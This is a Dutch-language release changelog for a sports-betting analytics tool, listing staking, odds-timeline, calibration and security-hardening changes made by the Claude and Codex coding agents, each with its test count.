Milestone release. Security-review afgerond, 6-punts EV-roadmap compleet, operator-hardening live.

### Highlights sinds v10.10.0
- **Security review**: gezamenlijke Claude × Codex deep audit → 19-punts action-list, 17/19 doorgevoerd
- **DB-backed auth**: blocked/demoted users worden direct geweigerd (geen 30d JWT-window meer)
- **RLS op alle 18 Supabase tabellen**: defense-in-depth, anon key kan geen data meer lezen
- **Push per-user**: geen cross-user notificatie-leak meer
- **XSS-class gesloten**: inline-handler patterns → data-attributes, escHtml quote-safe
- **Execution-gate live**: stake auto-gedempt bij dunne markten/stale prices
- **Calibration-monitor**: Brier/log-loss per signaal × sport × markt × window
- **Sharp reference**: Pinnacle/Betfair als aparte truth-laag, sharp-CLV per bet
- **Correlated-bet Kelly**: zelfde league/dag → quarter-Kelly op extra picks
- **Bayesian form-shrinkage**: extreme streaks gedempt in alle 6 sporten
- **Playability matrix**: per (sport, markt) drie aparte assen
- **Line-timeline**: volledige prijsgeschiedenis per fixture opvraagbaar
- **Unit-at-time**: eerlijke bet-historie over unit-wisselingen heen
- **MLB F5 diagnostiek**: waarom picks niet surfacen
- **Drift-checker fix**: geen handicap-prijs meer als ML
- **Operator-fixes**: scheduler-gate, MLB live-score, tracker auto-sync, CLV per betId
- **Performance**: 3 bets-queries → 1, saveAfUsage debounced, rateLimitMap cleanup
- **469 tests** (was 337 bij start van deze sprint)

## [10.10.21] - 2026-04-17

CLV-meting tegen Pinnacle closing line als ground truth (Codex' eerste post-roadmap voorkeur).

### Added
- **[claude] Sharp CLV: `bets.sharp_clv_pct` + `bets.sharp_clv_odds`**. Aparte CLV-meting naast bestaande execution-CLV (`clv_pct`). Industry-standard: positieve sharp-CLV = betere odds dan Pinnacle's sluitkoers = bewijs dat het model de markt verslaat. Execution-CLV blijft ongewijzigd.
- **[claude] `marketKeyFromBetMarkt(markt)` helper** in `lib/clv-match.js`. Mapt bet-markt-strings (`🏠 Ajax wint`, `Over 2.5`, `BTTS Ja`, etc.) naar canonical `(market_type, selection_key)` voor odds_snapshots lookup. Dekt ML, totals, BTTS, NRFI, F5 ML/totals, 3-way. Exotische markten → null (graceful skip).
- **[claude] CLV-recompute schrijft nu sharp-CLV mee** uit odds_snapshots Pinnacle closing. Query: laatste Pinnacle-snapshot vóór kickoff per fixture/markt/selectie. Niet-fataal bij ontbreken (Pinnacle niet in snapshot → sharp-CLV blijft null, execution-CLV ongestoord).
- **[claude] readBets output bevat `sharpClvOdds` + `sharpClvPct`** in zowel `lib/db.js` als `server.js` readBets-mapping.
- **[claude] Migratie `docs/migrations-archive/v10.10.21_sharp_clv.sql`**: additive kolommen op bets tabel.
- **[claude] +8 regressietests** voor `marketKeyFromBetMarkt`: ML/away/BTTS/Over/NRFI/F5/3-way/null-fallback.

### Tests
- `npm test` groen: `462 passed, 0 failed`.

## [10.10.20] - 2026-04-17

Sharp reference integratie v1 (roadmap punt 6). Pinnacle/Betfair/Circa als apart gescheiden "true price" referentie in de line-timeline.

### Added
- **[claude] `SHARP_BOOKIES` set + `isSharpBookie()` helper** in `lib/line-timeline.js`. Hard gescheiden van preferred/execution bookies (Codex-doctrine v10.10.14): sharp = Pinnacle, Betfair, Circa. Execution = Bet365, Unibet.
- **[claude] `bestSharpPrice` + `bestSharpBookie` in `snapshotAggregate`**. Elk tijdpunt-snapshot bevat nu naast market-best en preferred-best ook de sharp-reference prijs als aparte as.
- **[claude] `sharpGap` in `buildTimeline` output**. Verschil tussen sharp-reference prijs en preferred-prijs aan close. Positief = sharp biedt betere odds = Bart's execution-bookie achterloopt op de scherpste markt-referentie. Kan later door execution-gate of CLV-monitor geconsumeerd worden.
- **[claude] Ongebruikte `bayesSmooth` import opgeruimd** uit server.js (Codex-note v10.10.19).
- **[claude] +5 regressietests**: isSharpBookie detectie, snapshotAggregate sharp-velden, buildTimeline sharpGap berekening, null-fallback bij ontbrekende sharp-data.

### Note
- v1 scope: sharp-reference data is nu beschikbaar in de line-timeline shape maar wordt nog niet geconsumeerd door execution-gate of CLV-meting. Dat zijn vervolgslices (CLV tegen Pinnacle closing line, sharpGap in gate-thresholds).

### Tests
- `npm test` groen: `454 passed, 0 failed`.

## [10.10.19] - 2026-04-17

Broad Bayesian shrinkage op form-streaks (selection edge, roadmap punt 5). Zelfde principe als BTTS-H2H shrinkage (v10.8.23) maar nu op elke sport.

### Added
- **[claude] `shrinkFormScore(rawScore, nGames, prior, K)` in `lib/model-math.js`**. Bayesian smoothing op form-punten: dempt extreme streaks (5W→15pt of 5L→0pt) richting neutrale prior (1.5 pt/game). Bij 5 games: WWWWW shrunkt van 15→11.25, LLLLL van 0→3.75. Bij 20 games: nauwelijks demping (w=0.8). Hergebruikt bestaande `bayesSmooth` helper.
- **[claude] Alle 6 sport-flows gebruiken shrinkFormScore** in formAdj-berekening: voetbal, basketball, hockey, baseball (met n=10 voor 10-game window), NFL, handball. Effect: extremere form-streaks wegen minder zwaar, neutrale form nauwelijks veranderd. Max formAdj-verschil daalt van ~4% naar ~2% bij 5 games — precies de zone waar variance het signaal domineert.
- **[claude] +6 regressietests**: 5W demping, 5L optrekken, neutrale onveranderd, meer data = minder shrinkage, baseball 10-game window, formAdj-verschil verkleint.

### Tests
- `npm test` groen: `449 passed, 0 failed`.

## [10.10.18] - 2026-04-17

Correlated-bet Kelly-reductie (discipline edge, roadmap punt 4). Direct EV-impact: voorkomt correlation-blow-ups bij meerdere picks in dezelfde league op dezelfde avond.

### Added
- **[claude] `lib/correlation-damp.js` discipline-module.** Twee correlatie-klassen:
  - `same_league + same_day`: tweede+ pick in cluster krijgt kelly × 0.5
  - `same_fixture`: tweede+ pick op dezelfde wedstrijd krijgt kelly × 0.25 (zwaardere demping)
  - Sterkste pick (hoogste expectedEur) in elk cluster behoudt volle kelly (Codex-nuance: "quarter-Kelly alleen op extra blootstelling")
  - Per pick audit-trail: `correlationAudit` met reason, clusterKey, dampFactor, positionInCluster, originalKelly/originalUnits
- **[claude] Correlatie-demping ingehaakt in scan-coordinator** (`server.js`, vóór ranking-sort). `applyCorrelationDamp(allPicks)` draait op de gecombineerde multi-sport picks-array. Log-regel: `📉 Correlatie-demping: N pick(s) gedempt`. Kelly/units/expectedEur/strength proportioneel aangepast.
- **[claude] +9 regressietests**: solo pick (geen demping), same-league-day clustering, same-fixture zwaardere demping, cross-league geen demping, operatorDay timezone-conversie.

### Note
- v1-definitie (Codex-keuze): `(a) zelfde league + zelfde operator-dag`. Later verfijnbaar naar (b) markt-richting of (c) team-involvement. Module is bewust niet "correlation engine" genoemd — twee pure functies die discipline doen.

### Tests
- `npm test` groen: `442 passed, 0 failed`.

## [10.10.17] - 2026-04-17

MLB F5 hardening/visibility (slice 3, rescoped na Codex-review: geen greenfield maar diagnose waarom bestaande F5-flow niet surfacet).

### Added
- **[claude] Per-match F5 diagnostiek in MLB scan-output.** Logt nu per wedstrijd exact waarom F5 picks niet verschijnen: `pitcher data niet valid`, `geen F5 ML/totals odds in payload`, preferred-coverage issues via `diagBestPrice`. Formaat: `└─ F5 Detroit vs Kansas City: F5-ML skip: pitcher data niet valid · F5-Total skip: geen F5 totals odds`. Cap op 3 diag-items per match.
- **[claude] `diagBestPrice` op F5 ML calls**: consistent met hockey 2-way/3-way (v10.10.12-13). Preferred-bookie ontbreekt → echte market-edge zichtbaar i.p.v. stille skip.

### Note
- Bestaande F5-flow (server.js:4046-4120) was al functioneel maar produceerde geen picks. Deze slice voegt alleen diagnostiek toe om de oorzaak per scan zichtbaar te maken. Volgende stap: op basis van scan-output de echte bottleneck fixen (waarschijnlijk pitcher-validation of preferred-coverage).

### Tests
- `npm test` groen: `433 passed, 0 failed`.

## [10.10.16] - 2026-04-16

Slice 2: calibration-monitor (sectie 14.R2.A doctrine). Meten of onze signaal-voorspellingen écht gekalibreerd zijn, niet of we gewoon mooi lijken. Codex × Claude ontwerp, Claude codet, Codex reviewt.

### Added
- **[claude] `lib/calibration-monitor.js` pure compute-laag**. Brier-score, log-loss, calibration-bins, en per-signaal attributie. Gewichten beïnvloeden nu ook de hoofdmetrics zelf (niet alleen `n_effective`). Parseable percentages in `pick.signals[]` zoals `form:+2.5%` geven weighted attribution; uniform fallback blijft actief wanneer geen percentages beschikbaar zijn. Aggregate mode wordt expliciet opgeslagen als `weighted` / `uniform` / `mixed`.
- **[claude] Vaste windows `30d` / `90d` / `365d` / `lifetime`**. Voorspelbare storage + vergelijkbaarheid, geen arbitrary ranges — Codex-kalibratie.
- **[claude] Aggregatie-sleutel `(signal_name, sport, market_type, window_key)`**. Een signaal dat werkt voor voetbal-BTTS zegt niets over hockey-ML.
- **[claude] Supabase migratie `docs/migrations-archive/v10.10.16_signal_calibration.sql`**. Nieuwe tabel met `(signal_name, sport, market_type, window_key, window_start, window_end, n, brier_score, log_loss, avg_prob, actual_rate, bin_payload, attribution_mode, probability_source)`. Separate van `signal_stats` (lifetime summary); `signal_calibration` is de evaluatielaag — Codex-schema-keuze v10.10.15.
- **[claude] Daily job `updateCalibrationMonitor()`** in `server.js` — aangeroepen na `autoTuneSignalsByClv`. Leest settled bets van laatste 400d, aggregeert via `calibration-monitor`, en upsert expliciet `probability_source='ep_proxy'` zodat v1-data niet als canonical `pick.ep` gelezen wordt. Niet-fataal bij ontbrekende migratie (graceful skip).
- **[claude] Read-endpoint `GET /api/admin/v2/calibration-monitor`** met filters op `window` / `sport` / `market_type`. Rows bevatten ook `probability_source`; `ready: false` response als tabel nog niet gemigreerd.
- **[claude] regressietests uitgebreid**. Weighted Brier/log-loss/bins, window-start derivatie, row-building met `probability_source`, plus eerdere calibration edge-cases.

### Bewust niet
- **Autotune-integratie.** Calibration-monitor staat los van signal-weight autotune. Eerst enkele weken data verzamelen, dán beslissen of Brier-score in autotune-loop moet — Codex-scope-beperking.
- **Echte model-ep in pick_candidates.** v1 gebruikt bewust `ep_proxy = 1/odds + Σsignal_contribution%` op de `bets`-tabel. De canonical `pick_candidates.fair_prob = adjHome` (model's adjusted prob) vereist een bet↔pick_candidate join-layer die in aparte slice komt. Daarom labelt opslag/endpoint deze rows expliciet als `probability_source='ep_proxy'`.

### Tests
- `npm test` groen: `427 passed, 0 failed`.

### Follow-up
- Volgende slice kan de bet↔pick_candidate join leggen zodat `probability_source='pick_ep'` geschreven wordt in plaats van `ep_proxy`.
- Autotune blijft bewust los tot er genoeg echte calibration-data in `signal_calibration` zit.

## [10.10.15] - 2026-04-16

Codex-review fixes op v10.10.14 playability. Hotfix, geen nieuwe features.

### Fixed
- **[claude] `playable` promoveerde stilletjes naar `true` bij onbekende execution-coverage.** Voorheen: `executable === null` (caller leverde geen coverage-signal) + `lineQuality !== 'low'` gaf `playable = true` — effectief "execution unknown" interpreteren als "waarschijnlijk speelbaar". Gevaarlijk voor operator-beslissingen. Fix: strict `executable === true` vereist voor `playable`. Nieuwe boolean `coverageKnown` in output maakt downstream onderscheid tussen "niet speelbaar want false" en "niet speelbaar want onbekend" zonder `playable` zelf nullable te maken. (Codex-review v10.10.14, belangrijkste finding.)

### Changed
- **[claude] `basketball.total` dataRich-feed `pace` verwijderd.** Pace is afgeleid uit game-data, niet een externe feed. Het als capability behandelen maakte basketball semantisch te rijk op papier. `rest_days` blijft staan (wel meetbaar gamelog-based). Semantiek: `dataRich` = externe bronondersteuning, niet derived features. (Codex-kalibratie-note v10.10.14.)

### Added
- **[claude] +3 regressietests** voor de fix: `executable === null → playable=false + coverageKnown=false`, `preferredCount > 0 → executable=true met coverageKnown=true`, basketball pace wordt genegeerd in dataRich.

### Tests
- `npm test` groen: `410 passed, 0 failed`.

## [10.10.14] - 2026-04-16

Execution truth afmaken — slice 1 van de EV-gedreven roadmap (Codex × Claude consensus). Claude codet alles, Codex reviewt.

### Added
- **[claude] Execution-gate live in pick-flow** (component A, sectie 6 Bouwvolgorde fundament 3). `createPickContext` krijgt optioneel `executionMetrics` veld (canonical shape, niet ruwe `lineTimeline` — Codex-nuance). `buildPickFactory` roept `applyExecutionGate(hk, metrics)` aan binnen `mkP`, vóór `kellyToUnits`: dempt stake op stale/gap/overround/thin_market, hard skip bij `targetPresent=false`. Plus optionele `resolveExecutionMetrics(pick)` hook voor per-pick metrics. Geen pick-flow verandering voor call-sites zonder metrics (backwards-compat). `pick.executionAudit` geeft per pick het multiplier-spoor.
- **[claude] `lib/playability.js` matrix** (component D). Per `(sport, market_type)` een assessment met vier aparte assen: `executable` (preferred coverage?), `dataRich` (injury/lineup/starter feeds actief?), `lineQuality` (bookmaker-count tier), `playable` (aggregaat = `executable && lineQuality !== 'low'`). **`dataRich` blijft bewust aparte dimensie** (Codex-nuance): dunne enrichment maakt markt niet onspeelbaar, beïnvloedt confidence/ranking apart. Leunt op `lib/integrations/api-sports-capabilities.js` (Codex v10.10.11) voor injury-support detectie. Voorlopige `RELEVANT_FEEDS` mapping per sport × markt — te kalibreren op basis van echte scan-resultaten.
- **[claude] Hockey 3-way ML diag-symmetrie** (component B, downscoped). `diagBestPrice` in 3-way flow — geen stille skip meer als preferred ontbreekt. Consistent met v10.10.12 hockey 2-way.
- **[claude] +16 regressietests**: 6 voor execution-gate integratie (createPickContext met/zonder metrics, resolveExecutionMetrics voorrang, skip-pad, kelly-demping), 10 voor playability (lineQuality tiers, overround downgrade, dataRich aparte as van playable, apiHost auto-fill).

### Deferred
- **[claude] Uitrol multi-sport diag naar NBA/baseball/NFL/handball** vraagt per-match `diag`-array introductie (nieuwe structuur, buiten Codex' approval scope). Uitgesteld tot v10.10.15 na eerst Codex-review van deze release.
- **[claude] Gestructureerde `rejected_reason` enum** (component C uit slice-plan) vereist Supabase-migratie + call-site refactor. Scope te groot voor deze commit, vraagt Codex-input op schema-design. Uitgesteld tot v10.10.15.

### Tests
- `npm test` groen: `407 passed, 0 failed`.

### Review-vragen aan Codex
- `createPickContext` shape met optionele `executionMetrics` + `resolveExecutionMetrics` hook — past dit bij je PickContext-intent?
- `RELEVANT_FEEDS` mapping in `playability.js` — de sport × market feed-koppelingen zijn mijn eerste schatting. Waar wil je kalibreren?
- Gedeferde componenten B-uitrol + C-schema — akkoord om ze apart in v10.10.15 te landen?

## [10.10.13] - 2026-04-16

Issue #3: pre-kickoff drift-checker matchte verkeerde markt op MLB.

### Fixed
- **[claude] Pre-kickoff drift-check pakte handicap-prijs i.p.v. moneyline** voor MLB-bets met "Detroit Tigers wint" als markt-string. Root cause: `lib/clv-match.js` `resolveOddFromBookie()` path 11 (wint/winner/moneyline) gebruikte `findByNames(['Match Winner', 'Home/Away', ...])` met losse name-match — als de api-sports payload een Handicap-bet had die ook 'Home/Away' heette met `values: [{value:'Home +1', odd:1.74}, {value:'Away -1', odd:2.12}]`, werd die ML aangezien. Concreet symptoom: Unibet Tigers ML 2.02 → 2.00 (vrijwel stilstand) → notificatie zei "ODDS GEDRIFT 2.02 → 1.74 (-13.9%) · markt bevestigt jouw kant". Fix: ML-kandidaat moet ook door `NON_MAIN` regex, mag geen handicap-syntax in values hebben (`/[+-]\s*\d/`), en max 3 outcomes (=Home/Draw/Away) — zodat 1-run-handicap niet meer als ML wordt herkend.

### Added
- **[claude] +2 regressietests** in `lib/clv-match.js` — Detroit Tigers exact reproductie + positive test dat echte 'Home/Away' ML zonder handicap nog steeds werkt.

### Tests
- `npm test` groen: `391 passed, 0 failed`.

## [10.10.12] - 2026-04-16

Multi-sport issue #1 fix: `-100% edge` was preferred-bookie filtering, geen echte no-edge.

### Changed
- **[claude] `bestFromArr()` retourneert voortaan altijd preferred-best ÉN market-best velden**. Nieuwe shape: `{ price, bookie, isPreferred, preferredPrice, preferredBookie, marketPrice, marketBookie }`. Default `requirePreferred: true` houdt `price`/`bookie` op preferred-best — bestaande call-sites (incl. heel de voetbal-flow) krijgen ongewijzigd gedrag. Met `{ requirePreferred: false }` schuift `price`/`bookie` naar market-best, voor multi-sport diagnostiek waar Bet365/Unibet niet altijd dekken.
- **[claude] Hockey 2-way ML diag-output toont nu echte oorzaak i.p.v. `-100% edge` ruis**. Nieuwe `diagBestPrice(side, best, fairProb, minEdge)` helper splitst drie gevallen: (a) preferred prijs + edge te laag → `home edge X% < Y%` (huidig gedrag), (b) preferred ontbreekt + market wel → `home: geen preferred prijs (markt: Pinnacle @ 2.10, market-edge 5.0%)` (NIEUW — laat zien dat de markt actief is), (c) niets in markt → `home: geen prijs in markt`. NHL-scans zoals "Edmonton vs Vancouver: home 2-way edge -100.0%" worden nu interpretabel.

### Added
- **[claude] +7 regressietests**: bestFromArr-shape met preferred + market velden, `requirePreferred: false` mode, preferred-leeg-scenario (NHL/NBA/MLB), diagBestPrice gevallen (a/b/c), regressie dat `-100%` niet meer voorkomt in diag-strings als markt prijzen heeft.

### Note
- Pick-flow zelf is in deze commit niet aangeraakt — picks komen nog steeds alleen door op preferred bookies. Volgende slice: execution-gate inhaken zodat Max kan beslissen of hij niet-preferred edges als watch-signaal wil zien (sectie 10.A doctrine, `targetPresent` veld).

### Tests
- `npm test` groen: `389 passed, 0 failed`.

## [10.10.11] - 2026-04-16

### Added
- **[codex] Nieuwe `lib/integrations/api-sports-capabilities.js` helper** die API-Sports sportfamilies classificeert en expliciet aangeeft voor welke sporten injury coverage ondersteund wordt. Op dit moment: voetbal en American Football wel, basketball/hockey/baseball niet.

### Changed
- **[codex] Multi-sport scan doet geen misleidende injury-calls meer op unsupported API-Sports feeds**. NBA/NHL/MLB vragen niet langer blind `/injuries` op en loggen voortaan expliciet dat de blessurefeed door API-Sports niet ondersteund wordt, in plaats van `0 rows` alsof dat een bruikbare injury-bron was.
- **[codex] Multisport injury-issue opgesplitst van odds-filtering-issue**. Hierdoor blijft het duidelijk dat `-100% edge` en lege injuryfeeds twee losse oorzaken hadden: preferred-bookie filtering enerzijds, ontbrekende API-Sports injury coverage anderzijds.

### Tests
- `npm test` groen: `382 passed, 0 failed`.

## [10.10.10] - 2026-04-16

Bouwvolgorde fundament 3 geland + verdere scanner-core driftreductie.

### Added
- **[claude] Execution-gate als Kelly-damping op runtime-metrics** (sectie 6 Bouwvolgorde fundament 3, sectie 10.A doctrine). Nieuwe `lib/execution-gate.js` met pure `applyExecutionGate(hk, metrics, thresholds?)` die stake reduceert op basis van `targetPresent` (hard skip), `preferredGap` (absolute odds), `preferredGapPct` (relatief), `overroundPct` (sport-specifiek 2-way/3-way drempel) en `bookmakerCountMax`. Multipliers stapelen multiplicatief, output is auditable: per multiplier de bron en de drempel die hem triggerde. Doctrine-thresholds als `DEFAULT_THRESHOLDS` constant, calibratable per call.
- **[claude] `buildExecutionMetrics(...)` consolidator** die `summarizeExecutionQuality(...)` + `getLineTimeline(...)` outputs in de canonieke `executionMetrics` shape vertaalt. `targetPresent` gaat naar `null` (niet `false`) bij ontbrekende telemetrie zodat de gate niet per ongeluk hard skipt op missing data.
- **[codex] `createPickContext(options)` helper** in `lib/picks.js` die de losse options-bag (drawdownMultiplier, activeUnitEur, adaptiveMinEdge, sport) normaliseert in één expliciete context-object. `server.js`' lokale `buildPickFactory` bouwt nu eerst de context via `createPickContext(...)` voordat hij `createPickFactory(...)` aanroept. Sectie 14.R2.F.5 doctrine-actie is hiermee opgelost — buildPickFactory groeit niet verder vast aan ad-hoc options.
- **[claude+codex] +17 regressietests**. Claude: 16 voor execution-gate (hard-skip pad, elke threshold-tier, multiplicatief stapelen, threshold overrides, buildExecutionMetrics, end-to-end pipe). Codex: 1 voor createPickContext.

### Changed
- **[codex] Resterende pick-construction helper-drift opgeruimd**: `calcForm`, `calcMomentum`, `calcStakes`, `calcOverProb`, `calcBTTSProb`, `analyseTotal` zijn weg uit `server.js` en worden nu geïmporteerd uit `lib/picks.js` (canoniek). 88 regels uit `server.js` verdwenen, scanner-runtime en pick-factory hangen aan exact dezelfde helpers — geen silent-divergence risk meer.

### Note
- Execution-gate is nog niet ingelijfd in `buildPickFactory` zelf. Volgende ronde gebruik ik `createPickContext` als de natuurlijke plek om `executionMetrics` + `lineTimeline` doorheen te geven aan de gate.

### Tests
- `npm test` groen: `381 passed, 0 failed`.

## [10.10.9] - 2026-04-16

### Added
- **[claude] Nieuwe line-timeline / price-memory query-laag** in `lib/line-timeline.js` boven `odds_snapshots`. De module bouwt nu per `(selection_key, line)` een point-in-time timeline met `open`, `firstSeen`, `firstSeenOnPreferred`, `scanAnchor`, `latestPreKickoff`, `close`, `drift`, `preferredGap`, `stale`, `timeToMoveMs` en `bookmakerCountMax`, plus een async `getLineTimeline(...)` wrapper voor Supabase reads.
- **[claude] +11 regressietests voor de line-timeline laag**. De suite dekt grouping, scan-anchor selectie, preferred-gap/stale detectie, latest-pre-kickoff vs close, en de async Supabase happy-path/no-query flows.

### Changed
- **[codex] Resterende odds-helper drift opgeruimd in de canonieke odds-laag**. `calcWinProb`, `fairProbs`, `bestOdds`, `bookiePrice` en `convertAfOdds` leven nu ook centraal in `lib/odds-parser.js` in plaats van als dubbele definities in zowel `server.js` als `lib/picks.js`. Daardoor hangt scanner-runtime en pick-factory nu aan exact dezelfde odds-helpers.
- **[codex] Preferred-bookies truth expliciet gedocumenteerd in code**. `lib/odds-parser.js` maakt nu by-design duidelijk dat operator/admin settings canoniek zijn voor execution en dat hard-coded bookies alleen fallback/safety-net zijn wanneer settings ontbreken.
- **[codex] Pre-kickoff timeline-window rechtgetrokken**. `lib/line-timeline.js` behandelt `preKickoffWindowMs` nu als een aparte pre-close window direct vóór de close-window, zodat `latestPreKickoff` en `close` niet samenvallen en de 07:30/14:00/21:00 workflow correct kan onderscheiden tussen pre-close marktstatus en echte near-close state.

### Tests
- `npm test` groen: `364 passed, 0 failed`.

## [10.10.8] - 2026-04-16

### Added
- **[claude] `bets.unit_at_time` voor point-in-time correctness** (sectie 14.1 ronde 1 actie + sectie 6 Bouwvolgorde fundament 1). Bij elke bet wordt nu de unit-grootte (€) op moment van placement opgeslagen. Eerder dat ontbrak; CLV/ROI-berekeningen deelden alle historische `wl` door de huidige unit, wat na een unit-step-up alle historie retroactief vervormde. Migratie: `docs/migrations-archive/v10.10.7_unit_at_time.sql` (additive `ALTER TABLE bets ADD COLUMN IF NOT EXISTS unit_at_time NUMERIC`).
- **[claude] Schema-tolerant insert met drie tiers** in `writeBet` (`lib/db.js` + `server.js`). Tier 1: full payload (v10.10.7+). Tier 2: zonder `fixture_id`. Tier 3: zonder `unit_at_time`. Render-deploys op pre-migratie schemas blijven werken zonder panic.
- **[claude] +6 regressietests** voor `recomputeWl` met `unitAtTime`, `calcStats` per-bet unit-split (winU/lossU/legacy fallback), schema-fallback drie-tier patroon, en payload-shape consistentie.

### Changed
- **[claude] `lib/db.js` `calcStats` rekent winU/lossU/netUnits per bet** (`b.unitAtTime ?? unitEur`) i.p.v. wlEur door één unit te delen. Hetzelfde patroon toegepast op `server.js` `calcStats` (de duplicate). TODO-comment over unit_at_time-proxy is hiermee opgelost.
- **[claude] `lib/model-math.js` `recomputeWl` honoreert `row.unitAtTime`** voor settled-bet hervorming na odds/units edits — historische units worden niet meer overschreven door huidige unit.
- **[claude] `lib/db.js` + `server.js` `readBets` mapt `unit_at_time` naar `bet.unitAtTime`** zodat alle downstream-consumers point-in-time correct rekenen. Legacy NULL → fallback huidige user.unitEur.
- **[codex] Odds-parser cluster uit `server.js` gehaald naar `lib/odds-parser.js`**. `parseGameOdds`, `fairProbs2Way`, `setPreferredBookies`, `bestFromArr`, `bestSpreadPick` en `buildSpreadFairProbFns` leven nu in één gedeelde module. Dat maakt de scanner-core testbaarder en haalt een groot odds/ranking-monoliet uit `server.js`.
- **[codex] `server.js` en `lib/picks.js` gebruiken nu dezelfde canonieke odds-parser** in plaats van parallelle implementaties. Dat sluit drift-risico tussen live scanner en gedeelde libs.

### Docs
- **[claude] Doctrine "Laatste update" bijgewerkt naar v10.10.8**.

## [10.10.6] - 2026-04-16

### Changed
- **[codex] Calibratie-persist uit `server.js` gehaald naar een gedeelde store-module**. Nieuwe `lib/calibration-store.js` beheert nu cache, Supabase-read/write en file-fallback voor calibratie-state. Dat verkleint de inline runtime-state in `server.js` en maakt deze kritieke persistlaag testbaar in isolatie.
- **[codex] Regressietests toegevoegd voor de calibratie-store**. De suite dekt nu default-fallback, file-load, async Supabase-cache en save-path, zodat deze refactor niet ongemerkt terug kan vallen naar kapotte state of dubbele fetches.
- **[codex] `BUSINESS_PLAN.md` gearchiveerd** naar `docs/_archive/` zodat het oude SaaS-narratief niet meer in de actieve docs-flow trekt.
- **[codex] Releaseflow opnieuw bijgewerkt naar `10.10.6`**. Versie, changelog, info-page en docs zijn synchroon gehouden volgens de vaste release-discipline.

### Docs
- **[claude] Doctrine ronde 1 gemerged in canonieke secties** (`docs/PRIVATE_OPERATING_MODEL.md`). Open Punten 14.1–14.7 uit voorgaande consolidatielaag zijn verwerkt in de hoofdstukken (5, 6, 10.A/B/E/F, 13). Bouwvolgorde toegevoegd: `unit_at_time` → price-memory query-laag → execution-quality als Kelly-gate vóór nieuwe signal-expansion.
- **[claude] Doctrine ronde 2 geopend** met vier nieuwe fronten (modelintegriteit, security, test-discipline, UI cognitive load), onderzoeks-baseline (CLV-as-truth, bookmaker-tier dynamiek, fractional Kelly, multiple comparisons, survival > peak EV) en expliciete challenges aan Codex' v10.10.x design-keuzes. Sectie 14 in `PRIVATE_OPERATING_MODEL.md`. Geen code-impact — wacht op Codex' review.
- **[claude] README link bijgewerkt** naar nieuwe pad van het archief.

## [10.10.5] - 2026-04-16

### Changed
- **Kleine architectuur-cleanup na repo-review**. Ongebruikte duplicate `lib/poisson.js` is verwijderd; de canonieke Poisson-helpers leven nu alleen nog in `lib/model-math.js`. Dat verkleint drift-risico en maakt duidelijker welke math-pad productie echt gebruikt.
- **Releaseflow opnieuw synchroon gebracht**. Versie, changelog, info-page en docs zijn bijgewerkt naar `10.10.5` volgens de vaste release-discipline.

## [10.10.4] - 2026-04-16

### Fixed
- **Markt-multipliers UI miste sport-prefix bij legacy bare keys** (index.html:4636). Buckets als `home`/`over`/`btts_no` (oude calibratie-data van vóór sport-prefix) toonden geen sport-label terwijl `football_*` keys dat wél deden. Inconsistent met de grouping-logica die bare keys al naar `'football'` fallbackde. Fix: `renderRow()` gebruikt dezelfde fallback — eerste segment géén known sport ⇒ default `'football'` (legacy data van vóór sport-prefix-tijdperk).

## [10.10.3] - 2026-04-16

Follow-up op pre-merge review-feedback voor Codex's v10.10.2 (sport-specific starter/availability edges). Twee fixes geïdentificeerd in de review zijn nu doorgevoerd plus één voorzichtigheidsaanpassing.

### Fixed
- **NBA `availabilityAdj` dubbeltel-bug bij CLV-autotune (server.js:3151)**. v10.10.2 telde `nbaAvailability.adj + restAdj + nbaInjAdj` op terwijl `nbaAvailability` zelf al rest+inj-impact bevat. Bij default weights (0) merkbaar geen probleem (×0=0). Maar zodra `autoTuneSignalsByClv` `nba_rest_days_diff` of `nba_injury_diff` promoot naar weight > 0 ontstond een dubbeltelling van rust + blessure-impact (tot ~6-9% home-bias mogelijk). Fix: `nbaAvailability` is voortaan de canonieke combined helper. De losse weight-paden vangen alleen RESIDUAL boven nbaAvailability — `restResidualMult = max(0, weight − 1)`. Bij weight ≤ 1.0 (incl. promote naar 0.5): residual = 0, geen extra optelling. Pas bij handmatige weight > 1.0 wordt het extra geboost. Tijdbom is nu defused.

### Changed
- **NHL `goalieAdjustment` past nu `confidenceFactor` toe (lib/model-math.js:394)**. Output wordt vermenigvuldigd met `min(homeCf, awayCf)` waarbij cf uit `selectLikelyGoalie()` komt (1.0 high / 0.7 medium / 0.45 low op basis van games-played-gap tussen primary en backup goalie). Voorheen werd de full ±6% adj toegepast ook bij thin starter-data — nu zakt max-impact naar ±2.1% (medium) of ±1.35% (low). Note krijgt `cf×0.70` tag bij sub-1.0 confidence.
- **NHL `goalieAdjustment` svDiff-gewicht 3 → 1.5**. Voorheen tikte 0.020 save%-gap (typisch elite-vs-average) al de volle ±6% clamp aan op sv-component alleen. Halveren tot we 100+ settled NHL picks hebben om empirisch te kalibreren. Effect: 0.020 svDiff geeft nu 3% i.p.v. 6%.

### Tests
- 333 totaal (+3 nieuwe regressietests voor confidenceFactor-scaling, svDiff-gewicht en residual-multiplier).

### Niet aangepast (uit Codex's v10.10.2)
- `pitcherReliabilityFactor` IP-thresholds, `injurySeverityWeight` basketball-statussen, `extractNhlGoaliePreview` parser, 8-games goalie-floor — allemaal sterk, blijven.

## [10.10.2] - 2026-04-16

### Added
- **NHL goalie-preview laag toegevoegd**. Nieuwe `lib/integrations/nhl-goalie-preview.js` leest de officiële NHL gamecenter-preview uit en projecteert per team de meest waarschijnlijke starter, inclusief confidence-factor. De hockeyscanner kan deze matchup nu voorzichtig meewegen in de live ranking in plaats van goalie-context volledig te missen.
- **Nieuwe pure sport-context helpers + tests**. `lib/model-math.js` bevat nu `goalieAdjustment`, `injurySeverityWeight`, `nbaAvailabilityAdjustment` en `pitcherReliabilityFactor`, zodat goalie/injury/rest/starter-logica unit-testbaar en gedeeld blijft.

### Changed
- **NBA injury/rest van logged-only naar conservatief live-signaal**. Blessures worden nu gewogen op status (`out`, `doubtful`, `questionable`, etc.) en samen met rustverschil vertaald naar een voorzichtige availability-adjustment in de basketbalscanner.
- **MLB starters/F5 gedempt op samplebetrouwbaarheid**. Starter-gedreven edges gebruiken nu een reliability-factor op basis van innings pitched, zodat vroege-seizoens of dunne probable-pitcher samples minder agressief doorwerken, vooral in F5-markten.
- **Releaseflow bijgewerkt naar v10.10.2**. Versie, changelog, info-page en docs zijn opnieuw synchroon gebracht zoals afgesproken.

## [10.10.1] - 2026-04-16

### Added
